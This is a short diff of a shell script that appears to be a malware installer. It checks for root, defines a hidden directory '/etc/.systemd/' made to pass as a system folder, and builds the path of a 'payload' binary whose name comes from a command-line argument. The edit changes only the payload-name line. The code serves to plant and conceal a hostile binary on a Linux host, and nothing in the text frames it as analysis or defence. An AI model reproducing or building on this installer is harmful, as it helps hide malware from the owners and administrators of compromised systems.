@@ -22,7 +22,7 @@ if [ "$EUID" -ne 0 ]; then
 fi
 
 HIDDEN_DIR="/etc/.systemd/"           # Directory for binaries
-PAY_NAME="Zero"#$                     # Name of binary to installs (preferably .elf)
+PAY_NAME="Zero"#$1                    # Name of binary to installs (preferably .elf)
 PAYLOAD="${HIDDEN_DIR}${PAY_NAME}"    # Full path to payload
 
 
